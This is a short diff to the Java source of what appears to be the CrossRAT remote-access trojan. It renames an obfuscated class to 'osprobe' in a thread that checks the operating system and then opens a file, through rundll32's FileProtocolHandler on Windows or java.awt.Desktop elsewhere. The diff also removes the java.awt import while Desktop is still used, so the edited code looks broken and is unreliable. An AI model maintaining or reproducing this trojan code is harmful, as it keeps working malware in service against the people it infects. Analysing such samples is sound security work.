@@ -1,6 +1,5 @@
 package crossrat;
 
-import java.awt.*;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
@@ -14,7 +13,7 @@ final class i extends Thread {
 
     public final void run() {
         File var1 = new File(this.a);
-        a.a var2 = a.c.b();
+        osprobe.a var2 = osprobe.c.b();
         DataOutputStream var3 = null;
 
         try {
@@ -24,13 +23,13 @@ final class i extends Thread {
         }
 
         if (var1.exists()) {
-            if (var2.a() == a.c.a) {
+            if (var2.a() == osprobe.c.a) {
                 try {
                     Runtime.getRuntime().exec(new String[]{"rundll32", "url.dll,FileProtocolHandler", var1.getAbsolutePath()});
                 } catch (IOException var8) {
                     var8.printStackTrace();
                 }
-            } else if (var2.a() != a.c.b && var2.a() != a.c.c) {
+            } else if (var2.a() != osprobe.c.b && var2.a() != osprobe.c.c) {
                 if (Desktop.isDesktopSupported()) {
                     try {
                         Desktop.getDesktop().open(var1);
